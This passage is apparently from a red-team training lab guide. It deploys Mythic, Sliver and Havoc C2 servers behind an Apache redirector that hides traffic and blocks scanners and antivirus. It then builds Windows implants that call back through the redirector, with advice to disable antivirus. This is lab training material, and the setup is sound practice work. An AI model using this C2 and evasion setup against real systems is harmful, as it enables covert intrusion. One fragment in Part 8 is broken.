Mythic and Sliver have the URI prefix stripped before forwarding. Havoc receives the full path including the prefix. This is required because Havoc's listener validates URIs against the same paths embedded in the demon.

**Checkpoint:** ✅ Understand header validation, URI routing, and scanner blocking

### Step 3.5: Review Logs

All C2 traffic is logged to separate access/error log files:

```bash
# Get a shell on the redirector first (Guacamole > "Apache Redirector (SSH)" or jump via guac)
ssh -J admin@<GUAC_PUBLIC_IP> admin@<REDIR_PRIVATE_IP>

# HTTP access log
sudo tail -50 /var/log/apache2/redirector-access.log
sudo tail -50 /var/log/apache2/redirector-error.log

# HTTPS access log
sudo tail -50 /var/log/apache2/redirector-ssl-access.log
sudo tail -50 /var/log/apache2/redirector-ssl-error.log
```

**Checkpoint:** ✅ Redirector logging understood

## Part 4: Mythic C2 Setup

<details>
<summary>About Mythic C2</summary>

Mythic is a collaborative C2 framework built by Cody Thomas with a modern web-based GUI accessible through a browser. It uses a modular architecture where agents (called "payloads") and communication profiles are installed separately as Docker containers, making it highly extensible. Mythic is GUI-driven and includes a built-in task manager, file browser, and credential storage, making it well suited for multi-operator engagements.

</details>

The goal here is not to learn Mythic. Confirm the environment works end-to-end by getting a Windows `.exe` beacon to call back through the redirector. Once you have a callback, the lab is proven functional. For full documentation, refer to the [official Mythic docs](https://docs.mythic-c2.net).

### Step 4.0: Verify Pre-Installed Profiles and Agents

The HTTP C2 profile and Apollo agent are installed automatically by the setup script. Verify they are present before proceeding:

```bash
cd /opt/Mythic
sudo ./mythic-cli status
```

Look for `apollo` and `http` under **Installed Services**. Both should show `running`.

**If either is missing, install manually:**

```bash
cd /opt/Mythic
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
sudo ./mythic-cli install github https://github.com/MythicAgents/apollo

# Restart to load new components
sudo ./mythic-cli stop
sleep 10
sudo ./mythic-cli start
```

**Checkpoint:** ✅ `apollo` and `http` both running under Installed Services

### Step 4.1: Verify HTTP C2 Profile is Running

**Access Mythic UI (from Windows workstation via Guacamole RDP):**

```http
https://mythic:7443
```

- Login: `mythic_admin`
- Password: `sudo cat /opt/Mythic/.env | grep MYTHIC_ADMIN_PASSWORD` (run on Mythic server)

```yaml
Navigate: Installed Services > C2 tab
```

The `http` profile should already show:

- **Container Status:** Online
- **C2 Server Status:** Accepting Connections

If it shows **Stopped**, click **"Start Profile"**.

**Checkpoint:** ✅ C2 Server Status shows "Accepting Connections"

### Step 4.2: Generate Agent

```yaml
Navigate: Create Payload (left sidebar)
```

The wizard has 5 steps:

**Step 1: Select Target OS:** Windows

**Step 2: Configure Payload:** Select **Apollo** and set build parameters:

| Build Parameter | Value |
| --------------- | ----- |
| Output Format | `WinExe` (Windows Executable) |

**Step 3: Select Commands:** Select all, or at minimum: `shell`, `download`, `upload`, `screenshot`

**Step 4: Select C2 Profiles:**

```yaml
Step 1: In the dropdown, select "http" and click "+ INCLUDE PROFILE"
Step 2: The profile expands below - configure the fields in the table below
```

| Field | Value |
| ----- | ----- |
| `callback_host` | `https://yourdomain.tld` (domain) or `https://<REDIR_PUBLIC_IP>` (IP-only/closed env) |
| `callback_port` | `443` |
| `callback_interval` | `10` |
| `callback_jitter` | `20` |
| `post_uri` | `cdn/media/stream/update` (no leading `/`) |
| `headers` | Add a row. KEY: `X-Request-ID`, VALUE: `<token from terraform output deployment_info>` |
| `encrypted_exchange_check` | Leave enabled (default) |

**Step 5: Build:** Click **Next**, give the payload a name (e.g. `apollo-training`), then click **Create Payload**

**Wait:** 30-60 seconds. A popup notifies you when done. Go to **Payloads** in the sidebar and click the green download icon.

**Checkpoint:** ✅ Agent `.exe` downloaded

### Step 4.3: Deploy Agent

The Mythic UI runs in the **Windows workstation browser**, so `apollo.exe` is already on the Windows workstation after the download in the previous step. Open `C:\Users\Administrator\Downloads\` in File Explorer and double-click `apollo.exe` to run it.

<details>
<summary>Extracting the agent to your host machine</summary>

Apollo (and all agents built in this lab) are unobfuscated by default. To get the binary to your host, zip it on the Windows workstation and copy it into the `GuacShare on Guacamole RDP\Download\` folder (visible in Windows Explorer under **This PC**). The Guacamole HTML5 sidebar will then show the file as a clickable download, which triggers a browser download to your host machine.

> [!WARNING]
> Windows Defender and most AV solutions will flag unobfuscated C2 agents on download or execution. Before downloading `apollo.zip` to your host, disable real-time protection or add your download folder as an exclusion. Any victim VM or target environment you run the agent in will also need AV disabled or exempted, unless you are specifically practicing AV evasion techniques.

```yaml
Step 1: Navigate to C:\Users\Administrator\Downloads\ > right-click apollo.exe > Compress to ZIP file
Step 2: Open This PC > GuacShare on Guacamole RDP > Download > copy apollo.zip into it
```

Then press `Ctrl+Alt+Shift` in Guacamole, click **Devices**, and click `apollo.zip` to download it to your host machine.

</details>

**Watch Mythic UI:**

- Click the **phone icon** (top nav) to open **Active Callbacks**
- A new row should appear within ~10 seconds showing `WIN-OPERATOR`, the administrator user, and the private IP

**Checkpoint:** ✅ Callback row appears in Active Callbacks

### Step 4.4: Test C2 Session

**In the Active Callbacks table**, click the callback's **ID button** (blue = low integrity, red = high) to open the tasking pane below.

**Issue a test command** by typing in the task input box:

```bash
shell whoami
```

**Expected output:** `win-operator\administrator`

**Verify Redirector Traffic (on redirector via SSH):**

```bash
sudo tail -f /var/log/apache2/redirector-ssl-access.log
```

**Look for:** Regular GET/POST requests to `/cdn/media/stream/status` and `/cdn/media/stream/update`

**Checkpoint:** ✅ C2 traffic flowing through redirector to Mythic

## Part 5: Sliver C2 Setup

<details>
<summary>About Sliver C2</summary>

Sliver is an open-source C2 framework developed by BishopFox, designed as a modern alternative to Cobalt Strike for red team operations. It supports multiple communication protocols (HTTP/S, DNS, mTLS, WireGuard) and cross-compiles implants for Windows, Linux, and macOS. Sliver is primarily CLI-driven through an interactive console, with multiplayer support allowing multiple operators to connect to a shared server daemon simultaneously.

</details>

The goal here is not to learn Sliver. Confirm the environment works end-to-end by getting a Windows `.exe` implant to call back through the redirector. Once you have a callback, the lab is proven functional. For full documentation, refer to the [Sliver wiki](https://github.com/BishopFox/sliver/wiki).

### Step 5.1: Access Sliver Server

Two ways to get a shell on Sliver (pick one):

| Method | How |
| ------ | --- |
| Via Guacamole | Click **"Sliver C2 Server (SSH)"** in the Guacamole portal |
| From Windows workstation | Open MobaXterm > **redStack Lab** > **Sliver C2 Server (SSH)** |

> [!NOTE]
> For a CLI-only experience from your host machine, SSH into the Guacamole instance using your AWS key (it has a public Elastic IP) and use it as a jumpbox:
> `ssh -i rs-rsa-key.pem -J admin@<GUAC_PUBLIC_IP> admin@sliver`
> Get the Guacamole IP from `terraform output deployment_info`.

### Step 5.2: Connect to Sliver and Create Listener

The Sliver daemon runs automatically as a systemd service on boot. Connect to it using the Sliver client:

```bash
sliver-client
```

**On first login only:** import the pre-built C2 profile. This only needs to be done once per deployment since Sliver stores it in its database:

```bash
sliver > c2profiles import --file /home/admin/redstack-c2-profile.json --name redstack
```

> [!NOTE]
> The `redstack` C2 profile is pre-generated at boot with the correct `X-Request-ID` token from your Terraform configuration. Import it once per deployment; Sliver stores it in its database so this step is not needed again after a reconnect.

**Start the HTTP listener:**

```bash
sliver > http --lhost 0.0.0.0 --lport 80
```

This starts a plain HTTP listener on port 80. The implant connects over HTTPS to the redirector, which terminates SSL and forwards plain HTTP internally to Sliver on port 80.

> [!WARNING]
> SSL terminates at the Apache redirector. Sliver receives plain HTTP on port 80 internally. The implant callback URL remains `https://yourdomain/...` so traffic is encrypted from the target's perspective.

**Checkpoint:** ✅ Sliver HTTP listener running on port 80

### Step 5.3: Generate Implant

Generate the implant using the `redstack` C2 profile:

```bash
sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe
```

Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`, or the redirector's public IP for closed/IP-only environments (`https://<REDIR_PUBLIC_IP>/cloud/storage/objects/`). The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.

**Transfer the implant to the Windows workstation:**

> [!TIP]
> Run the SCP command from PowerShell on the Windows workstation. The `sliver` hostname resolves automatically via the hosts file, so no IP is needed. This does not interrupt your active Sliver console session.

```powershell
scp admin@sliver:/tmp/implant.exe C:\Users\Administrator\Desktop\implant.exe
```

Authenticate with the lab SSH password when prompted.

Execute the implant on the Windows workstation. You should see a new session appear in the Sliver console.

**Checkpoint:** ✅ Sliver implant calling back through redirector

### Step 5.4: Test Sliver Session

```bash
sliver > sessions
```

> [!TIP]
> Use `sessions -i [SESSION_ID]` to list and interact with a session in one command instead of two steps.

```bash
sliver > use [SESSION_ID]

sliver (SESSION) > whoami
sliver (SESSION) > pwd
```

**Verify Redirector Traffic (on redirector via SSH):**

```bash
sudo tail -f /var/log/apache2/redirector-ssl-access.log
```

**Checkpoint:** ✅ Sliver C2 operational through redirector URI prefix /cloud/storage/objects/

---

## Part 6: Havoc C2 Setup

<details>
<summary>About Havoc C2</summary>

Havoc is a modern open-source C2 framework developed by Paul Ungur (5pider) with a focus on evasion and advanced post-exploitation. It features a Qt-based GUI client (the "Katana" client) that connects to a remote teamserver, similar in model to Cobalt Strike. Havoc's agents ("Demons") are written in C and include features like indirect syscalls and sleep obfuscation, making it a popular choice for practicing modern evasion techniques.

**Access model:** The Havoc client GUI runs directly on the Havoc server inside an XFCE4 desktop. Operators access it through Guacamole via VNC with no local client install required.

</details>

The goal here is not to learn Havoc. Confirm the environment works end-to-end by getting a Windows `.exe` demon to call back through the redirector. Once you have a callback, the lab is proven functional. For full documentation, refer to the [Havoc Framework docs](https://havocframework.com/docs).

### Step 6.1: Build Havoc (run once after deployment)

Unlike other C2 servers in the lab, Havoc is **not pre-built**. The Go compiler, Havoc source, and Qt5 client are compiled on first use. SSH and VNC are available shortly after boot; the build runs as a manual step.

**Via Guacamole:** Click **"Havoc C2 Server (SSH)"**, then run:

```bash
~/build_havoc.sh
```

The script logs everything to `~/havoc_build.log` and takes **15-25 minutes** to complete. It is safe to re-run if anything fails.

When complete you will see:

```bash
===== Havoc Build Complete ...
```

**Checkpoint:** ✅ Build script finished with no errors

### Step 6.2: Verify Havoc Teamserver

The build script starts the teamserver automatically. Confirm it is running:

```bash
sudo systemctl status havoc
```

The teamserver runs on port 40056 with the profile at `/opt/Havoc/profiles/default.yaotl`.

**Operator Credentials** (same lab password as all other machines; see `terraform output deployment_info`):

- Username: `operator`
- Password: `<lab-password>`

> [!CAUTION]
> If the teamserver starts and immediately crashes, a stale database from a previous deployment may be the cause. Delete it and restart:
>
> ```bash
> rm /opt/Havoc/teamserver/data/teamserver.db
> sudo systemctl restart havoc
> ```

**Checkpoint:** ✅ Havoc teamserver running on port 40056

### Step 6.3: Open the Havoc Desktop and Connect the Client

**Via Guacamole:** Click **"Havoc C2 Desktop (VNC)"**

> [!NOTE]
> Havoc has two separate Guacamole connections. The **SSH** connection gives terminal-only access for checking service status and logs. The **VNC** connection opens the full XFCE4 desktop where the GUI client runs. The Havoc client can only be used from the VNC session.

An XFCE4 desktop loads. Double-click the **Havoc Client** icon on the desktop. If prompted that the file is not executable, click **"Mark Executable"** then double-click again to launch it.

When the login dialog appears, enter:

- **Name:** `operator`
- **Host:** `localhost`
- **Port:** `40056`
- **Username:** `operator`
- **Password:** `<lab-password>`

If the icon is not on the desktop, open a terminal and run:

```bash
havoc-client client
```

**Checkpoint:** ✅ Havoc client connected to teamserver

### Step 6.4: Create Listener and Generate Demon

> [!IMPORTANT]
> Retrieve your `X-Request-ID` token before creating the listener. It is required for the **Headers** field and gets baked into the demon at generation time. Run this on your local machine:
>
> ```bash
> terraform output deployment_info
> # Look for: C2 Header: X-Request-ID: <token>
> ```

**Create the listener in the Havoc client:**

```yaml
Step 1: View > Listeners > Add
Step 2: Configure the following fields (see table below)
```

| Field | Value |
| ----- | ----- |
| Payload | Http |
| **Hosts** | `yourdomain.tld` (domain) or `<REDIR_PUBLIC_IP>` (IP-only/closed env), then click **Add** |
| Host (Bind) | `0.0.0.0` |
| PortBind | `80` |
| **PortConn** | `80` |
| **Uris** | `/edge/cache/assets/update`, then click **Add** (add more if desired, all must start with `/edge/cache/assets/`) |
| **Headers** | `X-Request-ID: <token>`, then click **Add** (no quotes around token) |

> The **Hosts** field is the callback address baked into the demon. The **Uris** and **Headers** are embedded in the demon so it sends them on every check-in. The redirector validates the URI prefix and header, then forwards the full path (prefix intact) as plain HTTP to Havoc on port 80.

```yaml
Step 3: Click Save
```

**Generate a Demon (Havoc implant):**

> [!CAUTION]
> The **Spawn64** and **Spawn32** fields in the Injection section are required. Leaving either blank causes a silent build error. Always fill both in before clicking Generate.

```yaml
Step 1: Attack > Payloads
Step 2: Select the listener you just created > set Arch x64, Format Windows Exe
Step 3: Injection > Spawn64 = C:\Windows\System32\notepad.exe
Step 4: Injection > Spawn32 = C:\Windows\SysWOW64\notepad.exe
Step 5: Click Generate  (output saved to /home/admin/Desktop/demon.x64.exe)
```

**Transfer the demon to the Windows workstation:**

From the Windows machine (via Guacamole RDP or MobaXterm), pull the file from the Havoc server:

```powershell
scp admin@havoc:/home/admin/Desktop/demon.x64.exe C:\Users\Administrator\Desktop\
```

**Checkpoint:** ✅ Havoc Demon calling back through redirector URI prefix /edge/cache/assets/

> [!TIP]
> With all three C2 listeners running, re-run the redirector test script to confirm all backends show **OK**:
>
> ```bash
> sudo /home/admin/test_redirector.sh
> ```
>
> All three entries under **Testing direct backend connectivity** should now show `OK`.

## Part 7: Troubleshooting

Reference this section if any component is not behaving as expected after deployment. Each subsection targets a specific failure mode with symptoms, root cause, and fix.

<details>
<summary>Connectivity Checks</summary>

#### C2 Server Isolation

All three C2 servers (Mythic, Sliver, Havoc) have no public IPs and are unreachable from the internet by design. All C2 traffic must flow through the Apache redirector. Verify VPC peering is working from the redirector:

```bash
ping -c 3 mythic
ping -c 3 sliver
ping -c 3 havoc
```

#### Verify Agent Callbacks

- **Mythic:** Active Callbacks page in the web UI
- **Sliver:** `sessions` command in the Sliver console
- **Havoc:** Active sessions in the Havoc client

#### Review Redirector Logs

```bash
sudo tail -20 /var/log/apache2/redirector-ssl-access.log
sudo tail -20 /var/log/apache2/redirector-access.log
```

URI prefixes in the logs identify which C2 is receiving traffic:

```ini
/cdn/media/stream/      = Mythic
/cloud/storage/objects/ = Sliver
/edge/cache/assets/     = Havoc
```

</details>

---

<details>
<summary>Component Health Checks</summary>

Use these checks if something isn't working as expected after deployment.

#### Mythic C2 Server

SSH to Mythic via Guacamole or jump host, then:

```bash
cd /opt/Mythic
sudo ./mythic-cli status
```

**Expected:** 8 core containers + `apollo` + `http` all showing `running`. The warnings about localhost binding are expected and harmless.

**Get admin password:**

```bash
sudo cat /opt/Mythic/.env | grep MYTHIC_ADMIN_PASSWORD
```

**Access web UI** (from Windows workstation or Guacamole RDP):

```http
https://mythic:7443
```

Login: `mythic_admin` / password from above.

#### Guacamole Server

SSH to Guacamole, then check Docker containers:

```bash
docker ps
```

**Expected:** 3 containers, all up: `guacamole/guacamole`, `postgres:15`, and `guacamole/guacd`.

#### Apache Redirector

SSH to the redirector, then run the pre-installed test script:

```bash
sudo /home/admin/test_redirector.sh
```

This checks Apache status, VirtualHost config, connectivity to all three C2 backends, and header/decoy page behavior.

**Check redirect.rules is loaded:**

```bash
grep -c 'RewriteCond' /etc/apache2/redirect.rules
```

**Test security layers manually** (must use a browser User-Agent; `curl` is blocked by redirect.rules):

```bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
HEADER_VALUE="<token from terraform output deployment_info>"
TARGET="yourdomain.tld"          # or <REDIR_PUBLIC_IP> for IP-only/closed environments

# Should return DECOY PAGE (no header)
curl -sk -A "$UA" https://$TARGET/

# Should return DECOY PAGE (wrong header)
curl -sk -A "$UA" -H "X-Request-ID: wrong-value" https://$TARGET/cdn/media/stream/test

# Should proxy to Mythic (connection refused if no listener, expected)
curl -sk -A "$UA" -H "X-Request-ID: $HEADER_VALUE" https://$TARGET/cdn/media/stream/test
```

**View Apache logs:**

```bash
sudo tail -50 /var/log/apache2/redirector-ssl-access.log
sudo tail -50 /var/log/apache2/redirector-ssl-error.log
```

> [!NOTE]
> AWS and Azure cloud IP blocks are **commented out by default** in redirect.rules because this lab runs in AWS. If you deploy outside cloud environments you can re-enable them:
>
> ```bash
> sudo nano /etc/apache2/redirect.rules
> # Uncomment: "Class A Exclusions", "AWS Fine Grained", "Azure", "Other VT hosts"
> sudo systemctl reload apache2
> ```

#### Sliver C2 Server

SSH to Sliver via Guacamole, then:

```bash
which sliver-server
```

If missing, see **Sliver Not Installed** (in Part 7 troubleshooting).

#### Havoc C2 Server

SSH to Havoc via Guacamole, then:

```bash
sudo systemctl status havoc
```

If not running: `sudo systemctl start havoc`. If the binary is missing, see **Havoc Build Failed** (in Part 7 troubleshooting).

#### SSH Connections via Guacamole

Each Guacamole SSH connection should connect without a password prompt and land at the correct hostname. Quick check:

```yaml
Step 1: Click "Mythic C2 Server (SSH)"   > prompt: admin@mythic:~$  > run: ping sliver
Step 2: Click "Guacamole Server (SSH)"   > prompt: admin@guac:~$
Step 3: Click "Apache Redirector (SSH)"  > prompt: admin@redirector:~$
Step 4: Click "Sliver C2 Server (SSH)"   > prompt: admin@sliver:~$
Step 5: Click "Havoc C2 Server (SSH)"    > prompt: admin@havoc:~$
```

**SSH security model:** All Linux servers allow password auth from within the C2 VPC (172.31.0.0/16) but require SSH keys from public IPs. This lets Guacamole connect with passwords while keeping public SSH key-only.

<details>
<summary>redirect.rules Download Fails</summary>

**Symptoms:** Apache fails to start, `apache2ctl -S` shows:

```bash
Invalid command '404:', perhaps misspelled or defined by a module not included
```

**Root Cause:** The redirector downloads `redirect.rules` from the public [redRules repo](https://github.com/BaddKharma/redRules) at boot. If the download failed (network issue, timeout), the file may be empty or contain an error response.

**Verify:**

```bash
head -3 /etc/apache2/redirect.rules
```

**Fix: Re-download manually on the redirector:**

```bash
curl -sL "https://raw.githubusercontent.com/BaddKharma/redRules/main/redirect.rules" \
  -o /etc/apache2/redirect.rules
sudo apache2ctl configtest && sudo systemctl reload apache2
```

</details>

---

<details>
<summary>Mythic nginx SSL Certificate Missing</summary>

**Symptoms:** `mythic_nginx` container keeps restarting. Logs show:

```bash
[emerg] cannot load certificate "/etc/ssl/private/mythic-cert.crt": No such file or directory
```

**Root Cause:** Mythic's `mythic-cli start` generates SSL certificates, but the setup script was previously running it as the `admin` user which cannot write to `/etc/ssl/private/` (root-owned). This is fixed in current versions of the setup script.

**Fix: Generate the cert manually:**

```bash
sudo openssl req -x509 -newkey rsa:4096 \
  -keyout /etc/ssl/private/mythic-cert.key \
  -out /etc/ssl/private/mythic-cert.crt \
  -days 365 -nodes -subj "/CN=mythic"

cd /opt/Mythic
sudo ./mythic-cli restart
```

**Verify:**

```bash
sudo ./mythic-cli status
# mythic_nginx should now show "running (healthy)"
```

</details>

---

<details>
<summary>Guacamole Connections Not Auto-Created (resolved in current version)</summary>

**Symptoms:** Some or all of the 7 connections don't appear in Guacamole UI after deployment

**Root Cause:** Previous versions had a bug where the setup script used incorrect database backend ('mysql' instead of 'postgresql'). Fixed in current version.

**Verify:**

```bash
# SSH to Guacamole server
ssh -i rs-rsa-key.pem admin@<GUAC_PUBLIC_IP>

# Check if connections exist
docker exec -it postgres_guacamole psql -U guacamole_user -d guacamole_db \
  -c "SELECT connection_id, connection_name, protocol FROM guacamole_connection;"
```

**Expected:** Should show 7 connections (1 RDP, 5 SSH, 1 VNC)

**If Missing, Manually Create via Guacamole UI:**

```yaml
Step 1: Log into Guacamole web UI
Step 2: Settings (top right) > Connections > New Connection
Step 3: For each missing connection - Protocol SSH, Hostname from terraform output, Port 22, Username admin, Password from deployment info
```

</details>

<details>
<summary>Mythic Not Starting</summary>

**Symptoms:** mythic-cli status shows containers not running

**Solution:**

```bash
# Preferred: use Guacamole "Mythic C2 Server (SSH)" connection
# Or jump via Guacamole from your machine:
ssh -J admin@<GUAC_PUBLIC_IP> admin@mythic

cd /opt/Mythic
sudo ./mythic-cli logs  # Check for errors
sudo ./mythic-cli restart
```

**Common Issues:**

- Docker still pulling images (wait 5 min)
- Port conflicts (check: `sudo netstat -tlnp`)
- Memory issues (upgrade to t3.large)
- Missing SSL cert. See **Mythic nginx SSL Certificate Missing** (in Part 7 troubleshooting above)

**Common Issues:**

- Windows still setting up (wait 10 min)
- Security group misconfiguration
- Guacamole didn't auto-configure connection

</details>

<details>
<summary>Agent Won't Callback</summary>

**Symptoms:** Agent executes but no callback in Mythic/Sliver/Havoc

**Checklist:**

- [ ] Listener is running on the C2 server
- [ ] Callback Host and Port match the redirector's domain/IP and port 443
- [ ] Agent sends the correct `X-Request-ID` header with the auto-generated token
- [ ] Agent URI uses the correct prefix (`/cdn/media/stream/`, `/cloud/storage/objects/`, or `/edge/cache/assets/`)
- [ ] Redirector Apache is running with all VirtualHosts enabled
- [ ] Redirector can reach the C2 server's private IP (test with ping)
- [ ] Agent user-agent is not blocked by redirect.rules (check for known scanner/AV strings)

**Debug (on redirector via SSH):**

```bash
sudo apache2ctl -S
systemctl status apache2

# Check logs (differentiate by URI prefix)
sudo tail -100 /var/log/apache2/redirector-ssl-access.log
sudo tail -100 /var/log/apache2/redirector-ssl-error.log

# Run the pre-installed test script
sudo /home/admin/test_redirector.sh
```

<details>
<summary>Terraform Errors</summary>

**Error:** `InvalidKeyPair.NotFound`

```bash
# List available keys
aws ec2 describe-key-pairs --query 'KeyPairs[].KeyName'
# Update terraform.tfvars with correct name
```

**Error:** `VPC limit exceeded`

```bash
# AWS accounts have a default limit of 5 VPCs per region.
# redStack creates 2 (team server + redirector), so you need at least 2 free slots.
# If you are at the limit, either delete unused VPCs or switch to the existing default VPC:
# In terraform.tfvars: use_default_vpc = true
```

</details>

---

## Post-Deployment Actions

### Cleanup (When Done)

```bash
terraform destroy
# Type 'yes' to confirm

# Verify removal
aws ec2 describe-instances --filters "Name=tag:Project,Values=redstack"
```

### Cost Management

All numbers below are for `us-east-1` on-demand pricing with the default redStack instance mix (2x Linux `t3.medium`, 3x Linux `t3.small`, 1x Windows `t3.medium`).

#### Recommended: Destroy Between Sessions

For a 5 to 10 hrs/wk study cadence, the cheapest pattern is to run `terraform destroy` at the end of each session and `terraform apply` again next time. You pay only for the hours the lab is actually running. No idle EBS, no idle Elastic IPs, no licensed Windows volume sitting around.

**Hourly compute mix:**

| Instance | Rate | Count | Subtotal |
| --- | --- | --- | --- |
| Linux `t3.medium` (Mythic, Havoc) | $0.0416/hr | 2 | $0.0832 |
| Linux `t3.small` (Guacamole, Sliver, Redirector) | $0.0208/hr | 3 | $0.0624 |
| Windows `t3.medium` (WIN-OPERATOR, license included) | $0.0608/hr | 1 | $0.0608 |
| **Total** | | | **~$0.21/hr** |

**Monthly cost at this cadence:**

| Hours/week | Hours/month | Compute | EBS + EIPs (no idle) | **Total** |
| --- | --- | --- | --- | --- |
| 5 hrs/wk | ~22 hrs | ~$5 | $0 | **~$5/mo** |
| 10 hrs/wk | ~43 hrs | ~$9 | $0 | **~$9/mo** |

**Tradeoffs to know about:**

- **First-time setup per redeploy is ~30 to 45 min** before the lab is ready to use: `terraform apply` (~10 min) + cloud-init (~5 to 10 min) + Windows initialization (up to ~15 min) + Havoc rebuild from source (~15 to 25 min, only on first deploy or if you redeploy from scratch).
- **DNS A records change** each redeploy in open mode (the redirector EIP is new each time). Update your registrar after every `apply`. With a short DNS TTL this propagates in minutes.
- **Let's Encrypt** has a 5 duplicate-cert-per-week limit per registered domain. Two to three sessions per week is fine. If you redeploy more often, switch to a staging cert during testing or use the closed-environment self-signed flow.
- **In-progress C2 state is destroyed** with the lab. Mythic callbacks, Sliver implants, Havoc demons, custom listener configs are all gone. For training that is usually the point. For longer engagements, use the stopped pattern below.

#### Alternative: Stop Between Sessions

Faster to resume (~5 to 10 min instance boot vs ~30 to 45 min full redeploy) and preserves all C2 state, at the cost of ~$21/mo of always-on storage and Elastic IPs.

| Hours/week | Compute | EBS + EIPs (always on) | **Total** |
| --- | --- | --- | --- |
| 5 hrs/wk | ~$5 | $21 | **~$26/mo** |
| 10 hrs/wk | ~$9 | $21 | **~$30/mo** |

The fixed $21/mo is roughly $14 EBS gp3 (175 GB total across 6 volumes) + $7 for the 2 Elastic IPs (Guacamole and redirector, billed 24/7 since the 2024 pricing change).

#### Reference: Always On

| Item | Calculation | Cost |
| --- | --- | --- |
| Compute, all instances 24/7 | 730 hrs x $0.2064/hr | ~$151/mo |
| EBS gp3 storage | 175 GB x $0.08/GB-mo | ~$14/mo |
| Elastic IPs | 2 x $0.005/hr x 730 hrs | ~$7/mo |
| **Total** | | **~$172/mo** |

Data transfer is excluded from all three scenarios because the first 100 GB/mo of outbound traffic is free and light study use does not exceed it.

> [!IMPORTANT]
> EBS volumes and Elastic IPs bill 24/7 even when instances are stopped. Stopping pauses compute charges only. The only way to eliminate all charges is `terraform destroy`.

#### How to Run Each Pattern

**Destroy after each session (recommended):**

```bash
terraform destroy
# Type 'yes' to confirm
```

Next session, redeploy with `terraform apply`. Update your DNS A records to the new redirector EIP and re-run Certbot in open mode.

**Stop instances (alternative, preserves state):**

```yaml
Step 1: AWS Console > EC2 > Instances
Step 2: Select all redStack instances
Step 3: Instance State > Stop
```

Or via AWS CLI (get instance IDs from `aws ec2 describe-instances`):

```bash
aws ec2 stop-instances --instance-ids i-xxxxx i-yyyyy i-zzzzz
```

---

## Success Criteria

At the end of this deployment, you should have:

- ✅ All 6 EC2 instances running and accessible
- ✅ 2 VPCs with peering configured
- ✅ Apache redirector with header validation, URI routing, and redirect.rules
- ✅ Mythic C2 server isolated (no public IP, internal only)

## Part 8: External Target Environments (HTB/VL/PG)

> [!NOTE]
> **This section is for External VPN Environments (ExtVPN) only.** The default redStack deployment uses a public domain, trusted TLS certificate, and htaccess filtering. Only follow this section if you are connecting to an isolated platform (HTB Pro Labs, THM, Proving Grounds) via OpenVPN where targets cannot reach the public internet.

Route traffic from your internal lab machines (Windows workstation, C2 servers) to external target environments like HackTheBox (HTB), VulnLabs (VL), or Proving Grounds (PG) through the Apache redirector's OpenVPN tunnel.

Double NAT:

    -> 10.100.0.2   (guacamole MASQUERADE on wg0)
    -> tun0 IP      (redirector MASQUERADE on tun0)
  ExtVPN target replies to tun0 IP; conntrack reverses both NATs on the way back.

Why VPC peering alone cannot do this:
  AWS VPC peering only delivers packets whose dst falls inside either
  VPC's CIDR (172.31.0.0/16 or 10.60.0.0/16). Packets to 10.13.38.33
  are silently dropped at the fabric; route tables, SGs, and
  source_dest_check=false make no difference.
  WireGuard frames are addressed to 10.60.x.x (redirector VPC IP),
  so they pass peering cleanly. The ExtVPN target IP rides inside the payload.
```

</details>

<details>
<summary>Why WireGuard? (Technical explanation)</summary>

AWS VPC peering has a hard constraint: it will only deliver packets whose destination IP falls within one of the two peered VPC CIDR blocks. Attempting to route ExtVPN target traffic (e.g. `10.13.38.33`) via a peering connection causes it to be silently dropped at the AWS fabric level. Correct route tables, security groups, and `source_dest_check=false` make no difference.

WireGuard solves this by creating a Layer 3 encrypted tunnel directly between Guacamole (in the default VPC) and the redirector (in the redirector VPC). Guacamole receives ExtVPN-bound packets from the teamservers via normal same-VPC routing, encapsulates them in WireGuard UDP frames, and sends those frames to the redirector over VPC peering. Because the WireGuard UDP frames are addressed to the redirector's VPC IP (`10.60.x.x`), not to the ExtVPN target, they pass through VPC peering cleanly. The redirector decapsulates the packets and forwards them out `tun0` to the OpenVPN server.

The result is a double-NAT path: Guacamole MASQUERADEs onto `wg0` (source becomes `10.100.0.2`), and the redirector's `ext-vpn` up-script MASQUERADEs onto `tun0` (source becomes the VPN-assigned IP). ExtVPN targets see traffic from the redirector's `tun0` IP and reply normally.

**WireGuard configuration is fully automatic.** Guacamole generates both keypairs at boot, writes its own config, then SSHes into the redirector to push the server config and start the service. No pre-deployment key generation is required.

</details>

### Step 8.1: Configure terraform.tfvars

Edit `terraform.tfvars` and set:

```hcl
enable_external_vpn                  = true   # installs OpenVPN + WireGuard, enables routing
enable_redirector_htaccess_filtering = false  # disables scanner/AV blocking (not needed in lab)
```

This enables the following at deploy time:

- Installs OpenVPN client on the redirector (`ext-vpn` systemd service)
- Installs WireGuard on both instances (redirector at boot, Guacamole configures both via SSH)
- Enables IP forwarding on both the redirector and Guacamole
- Disables AWS `source_dest_check` on both ENIs (required for packet forwarding)
- Routes ExtVPN target CIDRs in the default VPC to Guacamole's ENI (bypasses VPC peering restriction)

**Custom Target CIDRs (optional):**

The default routed CIDRs cover the most common HTB/VL/PG ranges. Adjust if your platform uses different subnets (check `ip route` on `tun0` after connecting):

```hcl
external_vpn_cidrs = ["10.10.0.0/16", "10.13.0.0/16", "10.129.0.0/16"]
```

> [!NOTE]
> If you already deployed without `enable_external_vpn = true`, a full `terraform destroy` followed by a fresh `terraform apply` is required. The WireGuard setup runs as part of cloud-init at first boot. It cannot be triggered on a running instance by re-applying Terraform.

### Step 8.2: Deploy and Obtain Your .ovpn File

```yaml
Step 1: Deploy the infrastructure with terraform apply
Step 2: Wait for cloud-init to complete on all instances (~5 minutes). Guacamole automatically configures the WireGuard tunnel with the redirector during this time.
Step 3: Download your .ovpn file from your ExtVPN platform (HTB, THM, or Proving Grounds)
```

### Step 8.3: Get the .ovpn File to the Redirector

Drop any `.ovpn` file into `~/vpn/` on the redirector. The service picks up whichever file is there. Two ways to do it:

#### Option A: Guacamole sidebar upload (browser only)

```yaml
Step 1: In Guacamole, open the "Apache Redirector (SSH)" connection
Step 2: Press Ctrl+Alt+Shift to open the sidebar
Step 3: Click Devices > upload your .ovpn file (it lands in ~)
Step 4: Move it into the vpn directory (command below)
```

```bash
mv ~/*.ovpn ~/vpn/
```

